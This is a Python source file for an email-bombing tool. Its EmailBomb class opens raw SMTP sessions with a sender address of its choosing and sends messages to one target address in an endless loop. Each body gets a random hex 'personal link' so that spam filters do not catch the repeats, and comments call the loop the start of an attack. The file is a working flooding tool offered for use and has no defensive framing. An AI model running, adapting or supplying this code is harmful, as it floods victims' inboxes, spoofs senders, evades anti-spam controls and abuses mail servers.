# -*- coding: utf-8 -*-
import Email
import random
import string
import time


class EmailBomb:
    def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.status_header = "No.{}: ".format(id)
        self.status = []
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表

        self.update_status("creating")
        self.create()

    def update_status(self, body):
        '''
        保存状态
        '''

        if type(body) == list:
            body = body[-1]  # 返回多个信息的时候只取最后一个条

        self.status_body = body
        self.status.insert(0, self.status_header+self.status_body)

    def create(self):
        self.emailer = Email.Email(
            to_addr=self.to_addr,
            from_addr=self.from_addr,
            SMTP_addrs=self.SMTP_addrs,
            port=self.port,
            timeout=self.timeout,
        )

    def attack(self, subject, content):
        '''
        攻击启动
        '''

        while 1:
            # 建立连接
            while 1:
                self.update_status("try to connect")
                code, msg = self.emailer.Connect()
                self.update_status(msg)
                if code:
                    # 建立会话
                    self.update_status("send ehlo")
                    code, msg = self.emailer.Send(u"ehlo antispam")
                    self.update_status(msg)
                    if not code:
                        continue

                time.sleep(random.random())
                # 表明发件地址
                self.update_status("send mail from")
                code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
                self.update_status(msg)
                if not code:
                    continue

                time.sleep(random.random())
                self.update_status("send rcpt to")
                # 表明收件地址
                code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
                self.update_status(msg)
                if code:
                    break

            while 1:
                # 信件具体内容
                self.update_status("send data")
                code, msg = self.emailer.Send(u"data")
                self.update_status(msg)
                if code:
                    break

            while 1:
                # to:
                self.update_status("send to")
                code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
                self.update_status(msg)
                if not code:
                    continue

                # from:
                self.update_status("send from")
                code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
                self.update_status(msg)
                if not code:
                    continue

                # subject:
                self.update_status("send subject")
                code, msg = self.emailer.Send("subject: "+subject+"\r\n", recv=False)
                self.update_status(msg)
                if not code:
                    continue

                break  # 上面都发送成功的话，就 break

            # body:
            self.update_status("send body")
            code, msg = self.emailer.Send(
                content+u"\r\n\r\n你的专属链接为："+"".join(
                    random.choice(string.hexdigits)
                    for i in range(32)
                )+"\r\n.\r\n",  # 随机化部分邮件内容

                check="250"  # 状态码为 250 说明发送成功
            )

            self.update_status(msg)

            time.sleep(1)
